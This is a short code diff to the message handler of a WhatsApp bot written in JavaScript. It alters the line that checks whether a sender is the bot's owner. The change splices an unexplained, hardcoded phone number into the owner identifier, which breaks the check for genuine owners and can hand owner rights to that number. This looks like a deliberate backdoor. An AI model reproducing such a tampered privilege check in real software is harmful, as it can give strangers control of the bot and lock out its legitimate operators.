@@ -129,7 +129,7 @@ conn.handler = async function (m) {
         let _args = noPrefix.trim().split` `.slice(1)
         let text = _args.join` `
   		  command = (command || '').toLowerCase()
-        let isROwner = [global.conn.user.jid, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        let isROwner = [global.conn.user.jid, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '6288223955883@s.whatsapp.net').includes(m.sender)
         let isOwner = isROwner || m.fromMe
 
   			let isAccept = plugin.command instanceof RegExp ? // RegExp Mode?
